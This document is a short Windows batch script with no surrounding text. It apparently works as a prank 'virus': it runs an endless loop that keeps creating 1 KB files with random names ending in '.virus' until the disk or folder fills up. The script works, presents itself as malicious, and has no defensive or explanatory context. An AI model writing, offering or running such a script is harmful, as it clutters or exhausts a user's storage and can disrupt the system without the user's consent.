@echo off
color 0a
:menu
cls
fsutil file createnew %random%.virus 1024
goto menu